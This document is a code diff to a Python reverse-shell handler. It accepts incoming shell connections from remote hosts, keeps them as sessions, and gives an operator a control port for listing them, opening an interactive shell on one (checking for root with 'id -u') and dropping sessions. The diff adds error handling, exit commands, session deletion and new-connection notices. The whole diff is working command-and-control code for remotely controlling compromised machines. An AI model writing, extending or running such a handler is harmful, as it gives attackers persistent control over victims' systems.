@@ -1,5 +1,4 @@
 import argparse
-import random
 import socket
 from multiprocessing import Process, Manager
 
@@ -15,6 +14,7 @@ args = parser.parse_args()
 
 manager = Manager()
 sessions = manager.list()
+conns = manager.list()
 server_started = datetime.datetime.now()
 PROMPT = '=> '
 
@@ -53,24 +53,44 @@ class Connection(Process):
                 self.conn.send(session_list.encode())
             elif r.startswith('i'):
                 try:
-                    addr, conn = sessions[int(r.split()[1])]
+                    index = int(r.split()[1])
+                    addr, conn = sessions[index]
                 except IndexError:
                     self.conn.send(b"Specify a valid session ID.\n")
                 else:
                     self.conn.send("Entering interactive shell on {}. Ctrl+D to quit.\n".format(addr[0]).encode())
                     conn.send(b"id -u\n")
-                    uid = int(conn.recv(100).decode())
+                    try:
+                        uid = int(conn.recv(100).decode())
+                    except BrokenPipeError:
+                        del sessions[index]
+                        continue
+                    except ValueError:
+                        uid = 1000
                     if not uid:
                         prompt = b'# '
                     else:
                         prompt = b'$ '
                     while True:
-                        self.conn.send(prompt)
+                        try:
+                            self.conn.send(prompt)
+                        except BrokenPipeError:
+                            break
                         cmd = self.conn.recv(1024)
-                        if cmd == b'\x04':
+                        if cmd == b'\n' or b'cd' in cmd:
+                            continue
+                        if cmd == b'exit\n' or cmd == b'quit\n':
+                            self.conn.send(b"Leaving...\n")
                             break
                         conn.send(cmd)
                         self.conn.send(conn.recv(1024))
+            elif r.startswith('d'):
+                try:
+                    index = int(r.split()[1])
+                    sessions[index][1].close()
+                    del sessions[index]
+                except (IndexError, ValueError):
+                    self.conn.send(b"Couldn't delete that\n")
 
 
 class StoppableServer(Process):
@@ -98,19 +118,21 @@ class ShellServer(StoppableServer):
             conn, addr = self.sock.accept()
             print("New shell from", addr[0])
             sessions.append((addr, conn))
+            for con in conns:
+                con.queue.put(addr[0])
         self.sock.close()
 
 
 class ControlServer(StoppableServer):
     def __init__(self, host: str = '127.0.0.1', port: int = 5555):
-        self.connections = []
+        self.conns = []
         super().__init__(host, port)
 
     def serve(self) -> None:
         print("Listening for control connections...")
         while not self.stopped():
             c = Connection(*self.sock.accept())
-            self.connections.append(c)
+            self.conns.append(c)
             c.start()
         self.sock.close()
 
